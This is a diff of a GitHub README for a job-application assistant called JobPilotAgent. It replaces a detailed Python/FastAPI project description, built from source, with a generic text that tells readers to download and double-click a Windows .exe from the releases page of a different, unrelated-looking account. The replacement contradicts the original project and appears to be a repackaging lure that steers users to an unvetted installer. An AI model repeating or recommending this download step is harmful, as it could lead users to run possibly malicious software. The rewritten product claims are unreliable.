@@ -1,475 +1,82 @@
-# JobPilot Agent
+# 🚀 JobPilotAgent - Automate job applications with human control
 
-**An evidence-grounded job application copilot with resumable human approval.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/diamantine-aneroidbarometer28/JobPilotAgent/releases)
 
-[![Quality](https://github.com/YueranCao2001/JobPilotAgent/actions/workflows/quality.yml/badge.svg)](https://github.com/YueranCao2001/JobPilotAgent/actions/workflows/quality.yml)
-[![Release](https://img.shields.io/github/v/release/YueranCao2001/JobPilotAgent?display_name=tag&sort=semver)](https://github.com/YueranCao2001/JobPilotAgent/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.11-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.128%2B-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
+JobPilotAgent helps you apply for jobs. It writes documents and keeps track of your search. You remain in charge of every application. It provides evidence for each item in your resume and generates documents you can edit.
 
-JobPilot turns job descriptions and personal project materials into traceable resume claims, application summaries, cover letters, audited DOCX exports, and an actionable application pipeline. Every exportable claim must cite source evidence, edited claims are revalidated on the server, and the workflow pauses for explicit human approval.
+## 🛠 What this tool does
 
-> **Release status:** v0.7.0 is portfolio-ready for trusted local or private-network use. The complete deterministic workflow runs without a model API key; an OpenAI key optionally enables structured model-assisted writing.
+Applying for jobs takes time. This tool speeds up the process. It reads your resume and matches it to job descriptions. It creates a document for each role. You review the draft before it sends or saves anything. The tool stores your progress in a private file on your computer.
 
-## At a glance
+### Features
+*   **Resume matching:** It finds links between your experience and the job requirements.
+*   **Document creation:** It writes professional files in the DOCX format.
+*   **Human control:** You approve every step before the agent moves forward.
+*   **Application tracker:** It saves your history in a local database.
+*   **Private storage:** All data stays on your machine.
 
-| Area | What JobPilot provides |
-|---|---|
-| Grounding | Stable evidence IDs, source paths, support states, and numerical-metric checks |
-| Workflow | LangGraph interrupt/resume with SQLite checkpoints and editable human review |
-| Outputs | Tailored claims, application summary, cover letter, and audited DOCX |
-| Product surface | Responsive browser workspace, workflow history, and application pipeline |
-| Operation | Local-first FastAPI service, optional access token, rate limit, Docker, and CI |
-| Quality baseline | 43 tests; controlled Recall@5 1.00; grounding precision 1.00; unsupported-claim rate 0.00 |
+## 📥 How to install the software
 
-**Documentation:** [Demo](#demo-and-interface-tour) | [Architecture](#architecture) | [Quick start](#quick-start) | [Workflow API](#workflow-api) | [Evaluation](#quality-and-evaluation) | [Roadmap](#milestones) | [Safety](#privacy-and-safety)
+You do not need programming knowledge to use this tool. Follow these steps to set up the software on your Windows computer.
 
-## Portfolio highlights
+1.  Visit the [official releases page](https://github.com/diamantine-aneroidbarometer28/JobPilotAgent/releases) to download the package.
+2.  Look for the file ending in `.exe` under the latest version.
+3.  Click the link to download the file to your computer.
+4.  Open your Downloads folder and double-click the file to start the installer.
+5.  Follow the prompts on your screen to complete the setup.
+6.  Launch the application from your desktop shortcut once the process finishes.
 
-JobPilot demonstrates an end-to-end applied AI system rather than a prompt wrapper:
+## 💻 System requirements
 
-- explicit Pydantic contracts connect ingestion, retrieval, generation, validation, API responses, checkpoints, and exports;
-- LangGraph interrupts and SQLite checkpoints preserve human approval across process restarts;
-- model-produced claims are revalidated locally for evidence IDs, lexical support, and numerical metrics;
-- PDF/DOCX uploads are bounded, parsed in memory, path-sanitized, and never committed to the repository;
-- editable claims cannot be approved unless the edited text still passes deterministic evidence validation;
-- the FastAPI service, responsive interface, application tracker, offline evaluations, CI, and package build form one testable vertical slice.
+To run this tool, ensure your computer meets these minimum standards:
 
-## Demo and interface tour
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8GB of RAM.
+*   **Storage:** 500MB of free disk space for the program and database.
+*   **Internet:** A stable connection to allow the agent to fetch job details.
 
-The screenshots below were captured from the running FastAPI application with fictional, privacy-safe demo data. They show the actual packaged HTML/CSS/JavaScript interface rather than design mockups.
+## ⚙️ How to use the agent
 
-### 1. Product overview
+Once you launch the app, you see a simple dashboard. Follow these steps to start your first application.
 
-![JobPilot product overview](docs/images/jobpilot-overview.png)
+### Step 1: Upload your resume
+The agent needs to know your history. Click the "Upload Resume" button and select your PDF file. The agent highlights your skills and experience levels.
 
-The landing view introduces the evidence-first workflow and the three product guarantees:
+### Step 2: Add job details
+Paste the job link or the text of the job description into the input box. The agent analyzes the requirements. It maps your skills to the specific role.
 
-- **Traceable:** every exportable claim retains its source ID.
-- **Private by default:** uploaded documents are parsed in memory and are not saved as source files.
-- **Human controlled:** the workflow pauses before approval and export.
+### Step 3: Review and edit
+The agent produces a draft. Open the document to review the content. If you want to change something, you can edit the text directly. Click the "Approve" button once the document meets your standards.
 
-### 2. Evidence review and complete application materials
+### Step 4: Track the result
+The tool saves the application status in the "Tracker" tab. You can mark jobs as "Applied," "Interviewing," or "Offer Received." This keeps your search organized.
 
-![JobPilot evidence review workspace](docs/images/jobpilot-review.png)
+## 🛡 Keeping your data safe
 
-The review workspace connects the core engineering features in one flow:
+This software runs locally on your machine. The internal database uses SQLite for safety. No information goes to a third-party server during the drafting process. You own all your data. If you delete the folder, all records leave your computer.
 
-1. Paste a job description and upload PDF, DOCX, Markdown, or text evidence.
-2. Generate requirement-to-evidence mappings and inspect supported or blocked claims.
-3. Edit a claim; the API revalidates its evidence IDs, lexical support, and metrics.
-4. Approve supported claims to create an application summary and cover letter.
-5. Download a DOCX containing the approved material and an Evidence Audit appendix.
-6. Reopen, clone, archive, or delete the resumable workflow from local history.
+## ❓ Frequently asked questions
 
-A saved workflow can be opened directly for a demo with `/?thread=<workflow-uuid>#workflow`.
+**Does the software apply to jobs for me?**
+No. The agent creates drafts and prepares documents. You retain full control. You must click the final button to submit or send your application. 
 
-### 3. Application pipeline
+**Can I run this on a Mac?**
+Currently, this version supports Windows systems. We suggest using a dual-boot setup or a virtual machine if you need to run this on other platforms.
 
-![JobPilot application tracking pipeline](docs/images/jobpilot-pipeline.png)
+**What happens if the internet cuts out?**
+The tracker saves your progress. You can resume your work as soon as the connection returns. The database updates automatically.
 
-The application tracker turns generated material into an actionable job-search workflow:
+**Does it use my personal info?**
+The tool uses details from your resume to fill gaps in your application. No data sits in the cloud. It stays on your hard drive. 
 
-- add a company, role, current status, due date, and next action;
-- filter Draft, Applied, Interview, Offer, and Closed applications;
-- update progress inline or remove obsolete records;
-- jump from an application card back to the tailoring workspace;
-- keep all records in the local SQLite database.
+**How do I update the software?**
+Check the releases page once a month for new versions. Download the new installer and run it. The setup process overwrites the old version and keeps your database history intact.
 
-All names and roles shown in these screenshots are fictional demo data.
+## 💡 Tips for better results
 
-### 90-second demo
+*   Use a clean, single-column resume file for best parsing results.
+*   Check the generated DOCX file for formatting errors before saving.
+*   Update your tracker frequently to maintain an accurate view of your job search.
+*   Keep your resume file updated in the settings area.
 
-1. Start the server and open `http://127.0.0.1:8000/`.
-2. Paste a job description and upload or paste privacy-scrubbed project evidence.
-3. Build the evidence map, inspect source IDs, and edit one proposed claim.
-4. Attempt an unsupported edit to show server-side rejection, then approve a supported version.
-5. Review the generated application summary and cover letter, then download the audited DOCX.
-6. Reopen, clone, or archive the workflow and add the role to the application pipeline.
-
-### Engineering discussion points
-
-- Why deterministic post-generation validation is still required after structured model output.
-- Why workflow persistence belongs below the UI approval layer.
-- How local-first operation reduces privacy and deployment complexity.
-- Where controlled fixtures are useful and where real-material evaluation is still required.
-- Why single-process rate limiting and a shared token are bounded private-deployment controls, not multi-tenant security.
-
-## Why JobPilot
-
-Job seekers repeatedly analyze job descriptions, identify skill gaps, locate project evidence, tailor resumes, write outreach, and track applications. Using a general-purpose language model directly can produce unsupported experience or invented metrics.
-
-JobPilot turns this process into an auditable workflow:
-
-- every exportable claim must reference at least one evidence ID;
-- numerical metrics must exist in the source evidence and are never inferred;
-- partially supported or unsupported claims are routed to human review;
-- v1 does not perform external writes such as email, calendar, or job submission;
-- the deterministic evidence pipeline works without an API key.
-
-## Current capabilities
-
-- Parse English and Chinese job descriptions into structured requirements.
-- Normalize common skills such as Python, FastAPI, SQL, RAG, LLMs, and LangGraph.
-- Load PDF, DOCX, Markdown, and text materials, then chunk them for weighted lexical retrieval.
-- Preserve `source_path` and `source_id` in requirement-to-evidence mappings.
-- Detect numerical metrics that are absent from the supporting evidence.
-- Expose FastAPI endpoints and a responsive browser UI for document upload, tailoring, editable evidence review, workflow history, approval, DOCX export, and application tracking.
-- Persist application records with SQLite and SQLModel.
-- Test the parsing, retrieval, validation, and API vertical slice.
-
-## Quality and evaluation
-
-The repository includes unit, API, workflow-resume, document-ingestion, export, security, and UI regression coverage. Retrieval and grounding scores use controlled fixtures so they remain reproducible; they are engineering baselines, not claims about every real resume or job description.
-
-| Check | Current result |
-|---|---:|
-| Automated tests | 43 passing |
-| Controlled retrieval Recall@5 | 1.00 |
-| Controlled grounding precision | 1.00 |
-| Controlled unsupported-claim rate | 0.00 |
-| Static quality gates | Ruff, mypy, JavaScript syntax, package build |
-
-```powershell
-uv lock --check
-uv run ruff format --check .
-uv run ruff check .
-uv run mypy app evals
-uv run pytest
-uv run python -m evals.score_retrieval
-uv run python -m evals.score_grounding
-```
-
-## Architecture
-
-```mermaid
-flowchart LR
-    JD["Job description"] --> P["Requirement parser"]
-    DOC["Resume and project materials"] --> C["Structured chunking"]
-    P --> R["Evidence retrieval"]
-    C --> R
-    R --> M["Requirement-to-evidence map"]
-    M --> W["Claim drafting"]
-    W --> V{"Evidence validation"}
-    V -->|supported| O["Approved claims"]
-    V -->|partial / unsupported| H["Human review"]
-    O --> T["Application tracker"]
-```
-
-## Learning and development timeline
-
-This route covers May 25 through the present. It intentionally includes gaps for practice, review, and other commitments; it does not assume continuous daily work. Each learning topic is paired with a concrete project outcome.
-
-```mermaid
-gantt
-    title JobPilot Learning and Development Route — 2026-05-25 to 2026-07-28
-    dateFormat  YYYY-MM-DD
-    axisFormat  %m/%d
-
-    section Problem framing
-    Agent, RAG, and grounded generation basics    :learn1, 2026-05-25, 7d
-    Evidence contracts and evaluation metrics     :dev1, after learn1, 5d
-
-    section Data modeling
-    Pydantic v2 and structured outputs            :learn2, 2026-06-10, 6d
-    Evidence, Claim, and Requirement models       :dev2, after learn2, 5d
-
-    section Retrieval and validation
-    Chunking, BM25 concepts, and rank fusion       :learn3, 2026-06-24, 7d
-    Source tracking and metric validation          :dev3, after learn3, 6d
-
-    section Service and state
-    FastAPI, SQLModel, and SQLite                  :learn4, 2026-07-10, 6d
-    API vertical slice and application records     :dev4, after learn4, 5d
-
-    section Engineering quality
-    Pytest, static checks, reproducible tooling    :learn5, 2026-07-23, 3d
-    Tests, dependency lock, and documentation      :dev5, 2026-07-26, 3d
-```
-
-| Learning topic | Matching development work | Verification |
-|---|---|---|
-| Agents, RAG, and grounded generation | Evidence-first architecture and safety rules | A claim cannot be supported without evidence |
-| Pydantic v2 | Core data contracts | Model-level validation and type checks |
-| Retrieval and chunking | Requirement-to-evidence mapping | Traceable source paths and chunk IDs |
-| Claim validation | Metric hallucination guard | Missing metrics are marked `partial` |
-| FastAPI and SQLModel | Service API and application tracking | API tests and SQLite persistence |
-| Pytest, Ruff, and mypy | Engineering quality gates | Automated tests and static checks |
-
-## Technology decisions
-
-- **Python 3.11**: compatible with current FastAPI, LangGraph, and SQLModel releases, with mature binary-wheel support.
-- **FastAPI, Pydantic 2, and SQLModel**: constrained to compatible release ranges in `pyproject.toml`.
-- **uv**: manages Python, the virtual environment, and `uv.lock`.
-- **SQLite**: local-first persistence with no external service dependency.
-- **Pytest, Ruff, and mypy**: testing, linting, formatting, and type checking.
-- **LangGraph and OpenAI**: optional `agent` dependencies to be introduced after the deterministic evidence chain is stable.
-
-The current milestone does not require Node.js or Docker. Supported Python versions are `>=3.11,<3.13`, prioritizing compatibility on Windows and with common binary dependencies.
-
-## Quick start
-
-```powershell
-git clone https://github.com/YueranCao2001/JobPilotAgent.git
-cd JobPilotAgent
-uv sync --extra documents
-uv run uvicorn app.api.main:app --reload
-```
-
-Open the browser approval interface at `http://127.0.0.1:8000/` or the interactive API documentation at `http://127.0.0.1:8000/docs`.
-
-Run the quality checks:
-
-```powershell
-uv run pytest
-uv run ruff check .
-uv run mypy app
-```
-
-## API example
-
-```powershell
-$body = @{
-  job_description = "We require Python and FastAPI experience to build APIs."
-  documents = @(
-    @{
-      source_id = "project"
-      source_path = "README.md"
-      content = "Built Python FastAPI endpoints with Pydantic validation."
-    }
-  )
-  language = "en"
-} | ConvertTo-Json -Depth 4
-
-Invoke-RestMethod -Method Post `
-  -Uri http://127.0.0.1:8000/v1/tailor `
-  -ContentType "application/json" -Body $body
-```
-
-## Workflow API
-
-The persistent workflow API uses UUID thread IDs and SQLite checkpoints:
-
-- `POST /v1/workflows` starts a run and pauses for claim review.
-- `POST /v1/documents/upload` extracts evidence from up to five PDF, DOCX, TXT, or Markdown files without persisting the uploads.
-- `GET /v1/workflows` lists active resumable workflows; use `include_archived=true` to include archived runs.
-- `GET /v1/workflows/{thread_id}` returns saved state and review payloads.
-- `POST /v1/workflows/{thread_id}/clone` creates a fresh run from the saved request.
-- `POST /v1/workflows/{thread_id}/archive` archives or restores a workflow without deleting its checkpoints.
-- `DELETE /v1/workflows/{thread_id}` removes its checkpoints and generated export.
-- `POST /v1/workflows/{thread_id}/decision` revalidates optional claim edits, then resumes with an approve or reject decision.
-- `GET /v1/workflows/{thread_id}/export` downloads a DOCX after approval.
-- `POST /v1/applications` creates a tracked application.
-- `GET /v1/applications?status=interview` lists and filters the pipeline.
-- `PATCH /v1/applications/{id}` updates status, due date, and next action.
-- `DELETE /v1/applications/{id}` removes a tracked application.
-
-Without `OPENAI_API_KEY`, the API uses deterministic drafting. With a key configured, it enables the structured Responses writer while preserving local validation and human approval.
-
-## Repository structure
-
-```text
-JobPilotAgent/
-├── app/
-│   ├── api/            # FastAPI entry point
-│   ├── schemas/        # Evidence, claim, job, and request models
-│   ├── services/       # Parsing, retrieval, validation, and tailoring
-│   ├── ui/             # Browser-based human approval interface
-│   └── storage/        # SQLite application tracking
-├── data/
-│   ├── source_docs/    # Local evidence materials
-│   └── generated/      # Generated artifacts
-├── tests/              # Unit and API tests
-├── pyproject.toml
-└── README.md
-```
-
-## Milestones
-
-### Milestone 1: Evidence-chain core — complete
-
-- Core Pydantic data contracts.
-- Deterministic requirement parsing.
-- Source-preserving retrieval and evidence mapping.
-- Numerical-metric validation.
-- FastAPI endpoints and SQLite application tracking.
-- Automated tests and a reproducible environment.
-
-### Milestone 2: Document ingestion and retrieval evaluation — baseline complete
-
-- PDF, DOCX, Markdown, and plain-text loaders.
-- Bilingual skill aliases and structure-aware chunking.
-- A labeled baseline of 30 retrieval queries.
-- Current synthetic-baseline Recall@5: 1.00; target on real personal materials: at least 0.85.
-
-Run the reproducible baseline with:
-
-```powershell
-uv run python -m evals.score_retrieval
-```
-
-### Milestone 3: Agent workflow — complete
-
-- Implemented explicit LangGraph parse, retrieve, draft, approval, and finalize nodes.
-- Implemented JSON-serializable state and human review with `interrupt()` / `Command(resume=...)`.
-- Implemented SQLite checkpoints and verified recovery in a newly opened graph process.
-- Added OpenAI Responses API structured writing with Pydantic parsing.
-- Added bounded exponential-backoff retries for transient provider errors.
-- Added token accounting and model-aware cost estimates.
-- Preserved local evidence-ID and metric validation after model generation.
-
-The workflow remains safe by default: it pauses before claims become exportable and requires an explicit approval decision using the same thread ID. The default model is `gpt-5.6-terra` for a quality/cost balance. Cost estimates use the public rates recorded on 2026-07-28 and should be reviewed when model pricing changes; cached-token adjustments are not yet included.
-
-### Milestone 4: Offline evaluation and export — evaluation/export core complete
-
-- Added 20 claim-level grounding labels covering supported, partial, and unsupported cases.
-- Current controlled-fixture results: grounding precision 1.00 and unsupported-claim rate 0.00.
-- Added semantic-overlap and expanded numerical-metric validation.
-- Added safe DOCX export for approved claims with an Evidence Audit appendix.
-- Added a redesigned responsive browser interface for drag-and-drop evidence input, claim review, decisions, usage display, and DOCX download.
-- Added privacy-preserving direct document upload with file-count, type, and 5 MB per-file limits.
-- Next: latency/cost benchmark runs on representative, privacy-scrubbed materials.
-
-Run both offline baselines with:
-
-```powershell
-uv run python -m evals.score_retrieval
-uv run python -m evals.score_grounding
-uv run python -m evals.benchmark_workflow --runs 5
-```
-
-These controlled fixtures are regression baselines, not claims about performance on real resumes or job descriptions. The UI requires no Node.js runtime and is packaged with the Python wheel.
-
-### Milestone 5: Portfolio and job-search readiness — complete
-
-- Added a responsive application pipeline with create, filter, update, and delete operations.
-- Added draft, applied, interview, offer, and closed status views with due dates and next actions.
-- Fixed the previously untested SQLModel-to-Pydantic response conversion path.
-- Rebuilt the HTML template with encoding-safe entities and added a regression assertion for historical mojibake.
-- Added token-aware authenticated DOCX downloads from the browser.
-- Added recruiter-oriented project highlights, a 90-second demo, and engineering discussion points.
-
-### Milestone 6: Complete materials, archival, and private access — complete
-
-- Added evidence-constrained application summaries and cover letters generated only from approved claims.
-- Added summary and cover-letter sections to both the browser review and audited DOCX export.
-- Added persistent archive/restore state in SQLite; active history hides archived workflows by default.
-- Added optional `JOBPILOT_ACCESS_TOKEN` protection for `/v1/*` endpoints. The browser stores the entered token in session storage only.
-- Added optional `JOBPILOT_RATE_LIMIT_PER_MINUTE` single-process rate limiting with `429` and `Retry-After` responses.
-
-Example private-local configuration:
-
-```powershell
-$env:JOBPILOT_ACCESS_TOKEN = "replace-with-a-long-random-value"
-$env:JOBPILOT_RATE_LIMIT_PER_MINUTE = "60"
-uv run uvicorn app.api.main:app --host 127.0.0.1 --port 8000
-```
-
-The built-in limiter is intentionally small and process-local. Multi-worker or internet-facing deployments must enforce distributed rate limits and authentication at the reverse proxy or gateway. The access token protects API routes but is not a multi-user account system.
-
-### Milestone 7: Product hardening and operations — baseline complete
-
-- Added editable claim review; every edit is revalidated against its cited evidence before approval.
-- Added local workflow history with open, clone, and delete operations.
-- Restored verified Chinese deterministic drafting and Chinese numerical-unit validation.
-- Added security response headers and metadata-only request logging; request bodies and uploaded content are not logged.
-- Added a dry-run-first generated-artifact cleanup command.
-- Added a privacy-scrubbed bilingual workflow benchmark. The current deterministic fixture (3 cases, 2 runs) averaged approximately 0.6 ms on the development machine with zero provider cost; machine-specific timing is not a production SLA.
-- Added GitHub Actions quality gates, Docker packaging, and Compose persistence.
-- Added an explicit online validation command that refuses to run without both an API key and `--confirm-spend`.
-
-Run operational checks with:
-
-```powershell
-uv run python -m evals.benchmark_workflow --runs 5
-uv run python -m app.maintenance --older-than-days 30
-uv run python -m app.maintenance --older-than-days 30 --apply
-```
-
-The online writer smoke test is intentionally opt-in and billable:
-
-```powershell
-$env:OPENAI_API_KEY = "your-key"
-uv run python -m evals.validate_online --confirm-spend
-```
-
-Use only privacy-scrubbed fixtures for the first online run. The command prints model, token, claim, blocked-claim, and estimated-cost fields. It was not executed during offline development because no project API key was supplied.
-
-## Deployment
-
-Local container deployment:
-
-```powershell
-docker compose up --build
-```
-
-The Compose volume persists checkpoints and generated exports under `/data`. The application sets CSP, frame, MIME-sniffing, referrer, and browser-permission headers. For internet-facing deployment, place it behind an authenticated TLS reverse proxy with request-size limits and rate limiting; the built-in UI is designed for trusted local or private-network use and does not claim to provide multi-tenant authentication.
-
-## Development journal and lessons learned
-
-This journal records engineering decisions that materially changed the project. Dates describe the learning and development route rather than implying uninterrupted daily work.
-
-| Period | Problem or learning focus | Decision and project outcome | Reusable lesson |
-|---|---|---|---|
-| May 25–31 | Grounded generation can still produce fluent but unsupported claims. | Defined evidence IDs, support states, and a rule that exportable claims must cite evidence. | Safety requirements should become data-model invariants, not prompt-only instructions. |
-| June 10–20 | Loosely shaped dictionaries made validation and API evolution fragile. | Adopted Pydantic v2 contracts for requirements, evidence, claims, requests, and structured model output. | Typed boundaries make agent state, API payloads, and tests evolve together. |
-| June 24–July 6 | Keyword retrieval needed traceability and bilingual normalization. | Added structure-aware chunks, skill aliases, source paths, stable IDs, and Recall@5 fixtures. | Retrieval quality is only useful when its provenance survives every downstream step. |
-| July 10–20 | Human approval had to survive process restarts. | Used LangGraph interrupts with SQLite checkpoints and UUID thread IDs. | An approval screen is not a safety boundary unless the underlying state is resumable and auditable. |
-| July 23–27 | Model output could contain invented metrics even when evidence IDs looked valid. | Added local post-generation evidence and numerical-metric validation. | Structured model output improves shape, but deterministic validation must still enforce truthfulness. |
-| July 28 | PDF/DOCX support introduced optional binary/document dependencies. | Standardized on Python 3.11 and bounded dependency ranges; document support remains an explicit extra. | Choose the runtime with the strongest ecosystem compatibility, then lock exact resolved versions. |
-| July 28 | Browser uploads could leak filenames, consume excessive memory, or fail with opaque 500 errors. | Parse in memory, strip path components, cap uploads at five files and 5 MB each, close resources, and convert malformed documents to 422 responses. | Treat uploads as untrusted input even in a local-first application. |
-| July 28 | Windows sandbox tooling intermittently returned `helper_unknown_error`, and PowerShell 5 could reinterpret BOM-less UTF-8 as a legacy encoding. | Kept all writes inside the repository, used narrowly scoped approved commands when required, restored text from Git blobs when needed, and wrote UTF-8 explicitly without a BOM. | Tooling failures and product failures are different; preserve a clean Git checkpoint and verify encoding before committing. |
-| July 28 | Static UI assets needed to work from an installed wheel without adding a Node runtime. | Kept the interface in packaged HTML/CSS/JavaScript and verified wheel contents plus JavaScript syntax. | A simpler deployment surface can be more valuable than a larger frontend toolchain for a local-first product. |
-
-### Compatibility decisions
-
-| Component | Selected range or version | Reason |
-|---|---|---|
-| Python | `>=3.11,<3.13` | Stable typing features and strong compatibility with the selected agent, API, and document libraries. |
-| FastAPI | `>=0.128,<1` | Pydantic v2 support while avoiding an unreviewed major-version change. |
-| LangGraph | `>=1.2,<2` | Supports interrupt/resume workflows and SQLite checkpoint integration. |
-| OpenAI Python | `>=2.20,<3` | Supports parsed structured Responses output used by the optional writer. |
-| pypdf / python-docx | `>=6.6,<7` / `>=1.2,<2` | Current document parsing APIs with bounded major versions. |
-| python-multipart | resolved to `0.0.32` | Required by FastAPI multipart uploads and locked by `uv.lock`. |
-| Project release | `0.7.0` | Portfolio-ready release with the application pipeline, encoding-safe UI, and complete job-search demo flow. |
-
-### Problems encountered and how to reproduce the checks
-
-- **Windows sandbox helper failure:** this affects some local command launches, not the application runtime. Retry with a narrowly scoped workspace command; do not disable filesystem protections globally.
-- **PowerShell UTF-8 handling:** use an editor configured for UTF-8 or explicit .NET UTF-8 APIs when modifying BOM-less files. Always run `git diff --check` and inspect documentation diffs before committing.
-- **Malformed PDF or DOCX uploads:** the API returns `422` with a safe parsing message. Unsupported extensions also return `422`; files above 5 MB return `413`.
-- **Optional document imports:** if PDF or DOCX support is unavailable, run `uv sync --extra documents`. The core deterministic text workflow remains independently testable.
-- **Known test warning:** the current Starlette/FastAPI `TestClient` stack reports an upstream `httpx` deprecation warning. It is monitored rather than suppressed; the dependency range will be changed after the supported migration path is stable.
-- **No API key:** leave `OPENAI_API_KEY` unset to use deterministic drafting. This is a supported mode, not a degraded test workaround.
-- **Access protection:** set `JOBPILOT_ACCESS_TOKEN` for trusted private use. This is a single-token control, not user authentication or authorization.
-- **Rate limiting:** set `JOBPILOT_RATE_LIMIT_PER_MINUTE` to a positive integer for a single-process guard; use gateway-level limits for multiple workers.
-- **Docker verification:** Docker and Compose files are included, but the development Windows environment did not have the Docker CLI installed. The Python package build was verified locally; run `docker compose build` on a Docker-enabled host before production deployment.
-
-Run the engineering gates after environment or dependency changes:
-
-```powershell
-uv lock --check
-uv run ruff format --check .
-uv run ruff check .
-uv run mypy app evals
-uv run pytest
-uv build
-```
-
-The controlled retrieval and grounding fixtures should also be rerun whenever parsing, chunking, retrieval, drafting, or validation changes.
-
-## Acceptance targets
-
-- Tailoring cycle under 10 minutes.
-- Evidence grounding precision of at least 0.90.
-- Unsupported-claim rate below 0.02.
-- Retrieval Recall@5 of at least 0.85.
-- Resumable interrupted workflows.
-- Every exported claim traceable to source material.
-
-These are acceptance targets and will only be marked as achieved after the evaluation suite passes.
-
-## Privacy and safety
-
-`data/source_docs/` may contain personal information. Do not commit real resumes, contact details, API keys, or private company materials to a public repository. `.env`, database files, and generated artifacts are ignored by Git by default.
+Keywords: ai-agent, document-processing, fastapi, human-in-the-loop, job-search, langgraph, portfolio-project, pydantic, python, rag, sqlite
